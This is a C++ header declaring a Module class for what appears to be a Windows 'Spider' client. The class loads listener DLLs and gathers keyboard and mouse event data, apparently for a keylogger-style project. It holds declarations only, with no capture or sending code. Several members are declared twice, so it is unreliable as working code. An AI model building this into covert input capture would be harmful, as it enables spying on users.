//
// Created by lavigne on 10/5/17.
//

#ifndef MODULE_HPP
#define MODULE_HPP

#define OP_KEYBOARD 0x01
#define OP_MOUSE 0x02

//# include <glob.h>
# include <windows.h>
# include "IListener.hh"
# include "client/SpiderClient.hpp"

class   Module
{
    std::string _filenameListener;
    char _opcode;
    IListener* _listener;
    HINSTANCE _dll;
public:
    /* Constr & Destr*/
    Module(char opcode, const std::string& filenameListener);
    Module();
    Module(Module& copy);
    Module& operator=(Module& copy);
    //Module(Module &copy);
    void    setFilenameListener(std::string filenameListener);
    void    run();

    virtual ~Module();

    /*Getters & Setters*/
    char    getOpcode() const; // identifier module
    void    setOpcode(char op);
	const std::string& getFilenameListener() const;


    /* Doing */
    void    addNextData(t_paquet *); //
    size_t  getDataSize();
    const std::string& getFilenameOutput() const;
    void    run();
    int loadListener();
    int unloadListener();
    void load(char opcode);
    char    getOpcode(); // identifier module
    void    getDatas(t_paquet *);
    std::string getFilename();
	std::list<std::string> getElements() const;
    Module& operator=(Module copy);
};



#endif //MODULE_HPP